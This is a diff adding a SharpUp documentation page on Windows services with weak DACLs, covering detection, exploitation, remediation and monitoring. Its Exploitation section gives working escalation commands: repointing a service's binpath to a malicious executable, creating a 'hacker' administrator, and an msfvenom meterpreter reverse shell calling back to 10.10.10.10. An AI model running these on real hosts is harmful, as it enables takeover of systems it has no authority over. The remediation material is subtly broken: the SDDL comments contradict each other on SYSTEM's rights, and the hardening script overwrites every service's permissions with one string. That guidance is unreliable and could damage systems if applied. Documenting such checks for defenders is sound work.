@@ -1,0 +1,368 @@
+---
+title: 'Modifiable Services'
+description: 'Services with weak DACL permissions'
+icon: 'gear'
+---
+
+## Overview
+
+The Modifiable Services check identifies Windows services where the service's DACL (Discretionary Access Control List) allows the current user to modify service configuration. This is different from modifiable service binaries or registry keys - this check examines the service object's permissions directly.
+
+<Info>
+This is one of the most direct privilege escalation paths. If you can modify a service that runs as SYSTEM, you can execute arbitrary code with SYSTEM privileges.
+</Info>
+
+## How It Works
+
+SharpUp queries each service's security descriptor and checks for dangerous permissions:
+
+**Checked Permissions:**
+- `SERVICE_CHANGE_CONFIG` - Can reconfigure service
+- `WRITE_DAC` - Can modify service DACL
+- `WRITE_OWNER` - Can take ownership
+- `GENERIC_ALL` - Full control
+- `GENERIC_WRITE` - Generic write access
+- `SERVICE_ALL_ACCESS` - All service rights
+
+### Technical Details
+
+1. Enumerate all services using `ServiceController`
+2. Query service security descriptor via `QueryServiceObjectSecurity`
+3. Parse DACL to find ACEs (Access Control Entries)
+4. Check if current user/groups have dangerous rights
+5. Report vulnerable services
+
+## Example Output
+
+```
+=== Modifiable Services ===
+    Service 'VulnSvc' (State: Running, StartMode: Automatic)
+    Service 'TestService' (State: Stopped, StartMode: Manual)
+```
+
+**Interpretation:**
+- You have permissions to reconfigure these services
+- VulnSvc is running and will restart automatically
+- You can change the executable path to your malicious binary
+
+## Exploitation
+
+### Method 1: Change Service Binary Path
+
+```powershell
+# Reconfigure service to run your executable
+sc config VulnSvc binpath= "C:\temp\malicious.exe"
+
+# Restart service
+sc stop VulnSvc
+sc start VulnSvc
+
+# Or restart computer if needed
+shutdown /r /t 0
+```
+
+### Method 2: Add User to Administrators
+
+```powershell
+# Change service to add local admin
+sc config VulnSvc binpath= "cmd.exe /c net user hacker P@ss /add && net localgroup administrators hacker /add"
+
+# Start service
+sc start VulnSvc
+
+# Service will fail to start but commands execute first
+```
+
+### Method 3: Service with Dependencies
+
+```powershell
+# Change service binary path
+sc config VulnSvc binpath= "C:\temp\shell.exe"
+
+# Set dependency on a service that starts automatically
+sc config VulnSvc depend= "LanmanWorkstation"
+
+# Set to automatic start
+sc config VulnSvc start= auto
+
+# Reboot - service starts automatically at boot
+```
+
+### Method 4: Reverse Shell
+
+```powershell
+# Generate payload
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f exe -o shell.exe
+
+# Upload to target
+# Change service to run payload
+sc config VulnSvc binpath= "C:\temp\shell.exe"
+sc config VulnSvc start= demand
+
+# Start service
+sc start VulnSvc
+```
+
+## Remediation
+
+<Steps>
+  <Step title="Identify Vulnerable Services">
+    ```powershell
+    # Check service permissions
+    sc sdshow VulnSvc
+    ```
+
+    Example output:
+    ```
+    D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWRPDTLOCRRC;;;AU)
+    ```
+  </Step>
+
+  <Step title="Set Secure Permissions">
+    ```powershell
+    # Set secure SDDL for service
+    # This SDDL allows:
+    # - SYSTEM: Full control
+    # - Administrators: Full control
+    # - Interactive Users: Start, stop, read
+    # - Authenticated Users: Read only
+
+    $secureSddl = "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)"
+
+    sc sdset VulnSvc $secureSddl
+    ```
+  </Step>
+
+  <Step title="Bulk Remediation">
+    ```powershell
+    # Check and fix all vulnerable services
+    $services = Get-Service
+
+    foreach ($service in $services) {
+        $sddl = (sc.exe sdshow $service.Name | Out-String).Trim()
+
+        # Check for problematic permissions
+        # This is simplified - actual check would parse SDDL properly
+        if ($sddl -match "WD|BU|AU.*WP") {
+            Write-Host "[!] Vulnerable: $($service.Name)"
+
+            # Apply secure SDDL
+            sc.exe sdset $service.Name "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)"
+
+            Write-Host "[+] Fixed: $($service.Name)"
+        }
+    }
+    ```
+  </Step>
+
+  <Step title="Verify Fix">
+    ```bash
+    # Re-run check
+    SharpUp.exe ModifiableServices
+    ```
+  </Step>
+</Steps>
+
+### Understanding SDDL
+
+Service permissions are defined using SDDL (Security Descriptor Definition Language):
+
+```
+D:                                          # DACL
+(A;;CCLCSWRPWPDTLOCRRC;;;SY)               # SYSTEM: Read/Query
+(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)       # Administrators: Full Control
+(A;;CCLCSWLOCRRC;;;IU)                     # Interactive Users: Start/Stop
+(A;;CCLCSWLOCRRC;;;SU)                     # Service Users: Start/Stop
+```
+
+**Access Rights:**
+- `CC` - Query Config
+- `LC` - Query Status
+- `SW` - Enumerate Dependents
+- `RP` - Start Service
+- `WP` - Stop Service
+- `DT` - Pause/Continue
+- `LO` - Interrogate
+- `CR` - User-Defined Control
+- `RC` - Read Control (read security descriptor)
+- `WD` - Write DAC
+- `WO` - Write Owner
+- `SD` - Delete
+- `DC` - Change Config
+
+## Detection
+
+### Defensive Monitoring
+
+```powershell
+# Enable auditing for service changes
+auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable
+
+# Monitor Event IDs:
+# 4697 - Service installed
+# 7045 - Service installed (System log)
+# 4698 - Scheduled task created
+# Monitor registry changes to service keys
+
+Get-WinEvent -FilterHashtable @{LogName='System'; ID=7045} |
+Select-Object TimeCreated, Message
+```
+
+### Detection Strategies
+
+<Tabs>
+  <Tab title="Service Configuration Changes">
+    - Monitor sc.exe executions
+    - Alert on service ImagePath modifications
+    - Track service DACL changes
+    - Monitor service registry key modifications
+  </Tab>
+
+  <Tab title="Behavioral Detection">
+    - Baseline normal service configurations
+    - Alert on services spawning cmd.exe or powershell.exe
+    - Detect services with unusual ImagePaths
+    - Monitor service failures followed by new user creation
+  </Tab>
+
+  <Tab title="Permission Auditing">
+    - Regularly scan service DACLs
+    - Alert on services with weak permissions
+    - Track who modifies service permissions
+    - Monitor privilege escalation patterns
+  </Tab>
+</Tabs>
+
+## Real-World Scenarios
+
+<AccordionGroup>
+  <Accordion title="Scenario 1: Misconfigured Custom Service">
+    **Context:** IT team created custom service with "Users" group having modify permissions for troubleshooting.
+
+    **Attack Path:**
+    1. User identifies modifiable service via SharpUp
+    2. Changes service ImagePath to malicious executable
+    3. Restarts service or waits for automatic restart
+    4. Gains SYSTEM privileges
+
+    **Prevention:**
+    - Never grant Users modify rights on services
+    - Use proper service account delegation
+    - Remove troubleshooting permissions after testing
+  </Accordion>
+
+  <Accordion title="Scenario 2: Third-Party Software">
+    **Context:** Third-party application installer set weak service permissions.
+
+    **Impact:**
+    - Any user can reconfigure the service
+    - Service runs as LocalSystem
+    - Complete system compromise possible
+
+    **Solution:**
+    - Work with vendor to fix installer
+    - Manually correct service permissions
+    - Include in hardening baseline
+  </Accordion>
+
+  <Accordion title="Scenario 3: Service Installed by Non-Admin">
+    **Context:** User installed application that creates service (via exploit or misconfiguration).
+
+    **Risk:**
+    - Creator has full control over service
+    - Can leverage for privilege escalation
+    - May affect other users
+
+    **Fix:**
+    - Remove unauthorized services
+    - Restrict service installation to administrators
+    - Monitor service creation events
+  </Accordion>
+</AccordionGroup>
+
+## Prevention Best Practices
+
+<CardGroup cols={2}>
+  <Card title="Least Privilege" icon="user-shield">
+    Only SYSTEM and Administrators should have modify rights on services.
+  </Card>
+  <Card title="Regular Audits" icon="magnifying-glass">
+    Periodically scan and fix service permissions across all systems.
+  </Card>
+  <Card title="Group Policy" icon="network-wired">
+    Use GPO to enforce service security configurations.
+  </Card>
+  <Card title="Monitoring" icon="eye">
+    Enable audit policies and monitor service changes in real-time.
+  </Card>
+</CardGroup>
+
+### Service Hardening Script
+
+```powershell
+# Comprehensive service hardening script
+$report = @()
+$services = Get-Service
+
+foreach ($service in $services) {
+    try {
+        # Get current SDDL
+        $currentSddl = (sc.exe sdshow $service.Name | Out-String).Trim()
+
+        # Define secure SDDL
+        $secureSddl = "D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)"
+
+        # Check if current SDDL differs from secure
+        if ($currentSddl -ne $secureSddl) {
+            # Backup current SDDL
+            $report += [PSCustomObject]@{
+                ServiceName = $service.Name
+                OldSddl = $currentSddl
+                Action = "Modified"
+            }
+
+            # Apply secure SDDL
+            sc.exe sdset $service.Name $secureSddl | Out-Null
+
+            Write-Host "[+] Hardened: $($service.Name)" -ForegroundColor Green
+        }
+    }
+    catch {
+        Write-Host "[-] Error processing $($service.Name): $($_.Exception.Message)" -ForegroundColor Yellow
+    }
+}
+
+# Export report
+if ($report) {
+    $report | Export-Csv "C:\Audits\ServicePermissionChanges_$(Get-Date -Format yyyyMMdd).csv" -NoTypeInformation
+    Write-Host "[+] Report saved to C:\Audits\ServicePermissionChanges_$(Get-Date -Format yyyyMMdd).csv"
+}
+```
+
+## Related Checks
+
+<CardGroup cols={2}>
+  <Card title="Modifiable Service Binaries" icon="file-binary" href="/ghostpack-docs/SharpUp-mdx/checks/modifiableservicebinaries">
+    Service executables with weak file permissions
+  </Card>
+  <Card title="Modifiable Service Registry Keys" icon="key" href="/ghostpack-docs/SharpUp-mdx/checks/modifiableserviceregistrykeys">
+    Service registry keys with weak permissions
+  </Card>
+  <Card title="Unquoted Service Path" icon="quote-left" href="/ghostpack-docs/SharpUp-mdx/checks/unquotedservicepath">
+    Services with exploitable unquoted paths
+  </Card>
+  <Card title="Remediation Guide" icon="shield" href="/ghostpack-docs/SharpUp-mdx/remediation">
+    Comprehensive remediation guidance
+  </Card>
+</CardGroup>
+
+## References
+
+<CardGroup cols={2}>
+  <Card title="Microsoft Docs" icon="book" href="https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights">
+    Service Security and Access Rights
+  </Card>
+  <Card title="MITRE ATT&CK" icon="book" href="https://attack.mitre.org/techniques/T1543/003/">
+    T1543.003 - Create or Modify System Process: Windows Service
+  </Card>
+</CardGroup>
